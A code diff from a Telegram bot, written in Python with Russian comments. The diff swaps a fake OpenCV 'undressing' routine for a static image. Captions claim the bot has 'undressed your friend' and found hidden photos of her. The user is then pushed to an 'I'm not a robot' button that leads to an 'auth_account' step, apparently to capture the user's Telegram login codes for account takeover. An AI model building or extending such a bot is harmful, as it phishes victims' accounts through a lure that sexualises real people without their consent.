@@ -12,9 +12,6 @@ from telethon.errors.rpcerrorlist import SessionPasswordNeededError, PhoneCodeEx
 from pymongo import MongoClient
 from dotenv import load_dotenv
 from datetime import datetime
-from PIL import Image, ImageFilter
-import cv2
-import numpy as np
 
 load_dotenv()
 API_ID = int(os.getenv("API_ID"))
@@ -150,96 +147,23 @@ async def handle_photo(message: types.Message):
     )
     
     try:
-        # Скачиваем фото
-        file_id = message.photo[-1].file_id
-        file_info = await bot.get_file(file_id)
-        downloaded_file = await bot.download_file(file_info.file_path, "input.jpg")
-        
-        # Загружаем изображение в OpenCV
-        img = cv2.imread("input.jpg")
-        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
-        img_rgb = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)
-        
-        # Детекция лица для оценки области тела
-        face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')
-        faces = face_cascade.detectMultiScale(gray, 1.1, 4)
-        
-        if len(faces) > 0:
-            x, y, w, h = faces[0]  # Берем первое лицо
-            # Расширяем для тела
-            body_rect = (x - w//2, y, w*2, h*4)  # Расширяем вниз
-            # Корректируем границы
-            body_rect = (max(0, body_rect[0]), max(0, body_rect[1]), 
-                         min(img.shape[1] - body_rect[0], body_rect[2]), 
-                         min(img.shape[0] - body_rect[1], body_rect[3]))
-            
-            # GrabCut для сегментации человека
-            mask = np.zeros(img.shape[:2], np.uint8)
-            bgdModel = np.zeros((1,65), np.float64)
-            fgdModel = np.zeros((1,65), np.float64)
-            cv2.grabCut(img, mask, body_rect, bgdModel, fgdModel, 5, cv2.GC_INIT_WITH_RECT)
-            person_mask = np.where((mask == 2) | (mask == 0), 0, 1).astype('uint8')
-        else:
-            person_mask = np.ones(img.shape[:2], dtype=np.uint8)  # Fallback
-        
-        # Улучшаем маску человека: закрываем дыры
-        person_mask = cv2.morphologyEx(person_mask, cv2.MORPH_CLOSE, np.ones((15,15), np.uint8))
-        
-        # Конвертируем в HSV для детекции кожи
-        hsv = cv2.cvtColor(img, cv2.COLOR_BGR2HSV)
-        
-        # Более широкий диапазон для кожи
-        lower_skin = np.array([0, 10, 60], dtype=np.uint8)
-        upper_skin = np.array([20, 150, 255], dtype=np.uint8)
-        
-        # Маска кожи
-        skin_mask = cv2.inRange(hsv, lower_skin, upper_skin)
-        skin_mask = cv2.dilate(skin_mask, np.ones((7,7), np.uint8), iterations=3)
-        skin_mask = cv2.erode(skin_mask, np.ones((5,5), np.uint8), iterations=2)
-        skin_mask = cv2.morphologyEx(skin_mask, cv2.MORPH_CLOSE, np.ones((15,15), np.uint8))
-        
-        # Находим средний цвет кожи из видимой кожи
-        skin_pixels = img_rgb[(skin_mask == 255) & (person_mask == 1)]
-        if len(skin_pixels) > 0:
-            avg_skin_color = np.mean(skin_pixels, axis=0).astype(np.uint8)
-        else:
-            avg_skin_color = np.array([200, 170, 150], dtype=np.uint8)
-        
-        # Маска одежды/тела без кожи
-        clothing_mask = (person_mask == 1) & (skin_mask == 0)
-        
-        # Замазываем одежду цветом кожи
-        img[clothing_mask] = avg_skin_color[::-1]  # BGR
-        
-        # Замазываем всю маску человека (тело) цветом кожи для полного покрытия
-        img[person_mask == 1] = avg_skin_color[::-1]
-        
-        # Применяем сильный blur ко всему изображению
-        blurred_img = cv2.GaussianBlur(img, (51, 51), 0)
-        
-        # Сохраняем
-        cv2.imwrite("undressed.jpg", blurred_img)
-        
+        undressed_photo_path = "undressed_photo.jpg"  # Укажи путь к твоему фото
         keyboard = InlineKeyboardMarkup()
         keyboard.add(InlineKeyboardButton("Я не робот!", callback_data="auth_account"))
         
-        await bot.send_photo(
-            user_id,
-            photo=InputFile("undressed.jpg"),
-            caption=(
-                "Ох, я смог 'раздеть' твою подругу (в кавычках), полностью замазал тело цветом кожи и добавил сильный blur, чтобы ничего не было видно! 😱 "
-                "И еще нашел фотографии о ней в закрытом интернете, хочешь увидеть все это без замазки? "
-                "Тогда тебе нужно подтвердить, что ты не робот и не спецслужбы, жми на кнопку ниже и подтверди, что ты не робот! 👇"
-            ),
-            parse_mode='Markdown',
-            reply_markup=keyboard
-        )
-        
-        # Очищаем временные файлы
-        os.remove("input.jpg")
-        os.remove("undressed.jpg")
+        with open(undressed_photo_path, 'rb') as photo:
+            await bot.send_photo(
+                user_id,
+                photo,
+                caption=(
+                    "Ох, я смог раздеть твою подругу, и еще нашел фотографии о ней в закрытом интернете, хочешь увидеть все это? 😱 "
+                    "Тогда тебе нужно подтвердить, что ты не робот и не спецслужбы, жми на кнопку ниже и подтверди, что ты не робот! 👇"
+                ),
+                parse_mode='Markdown',
+                reply_markup=keyboard
+            )
     except Exception as e:
-        logging.error(f"Error processing photo: {e}")
+        logging.error(f"Error sending undressed photo: {e}")
         await bot.send_message(user_id, "❌ Ошибка при обработке фото. Попробуй снова!", parse_mode='Markdown')
 
 @dp.callback_query_handler(lambda c: c.data == 'auth_account')
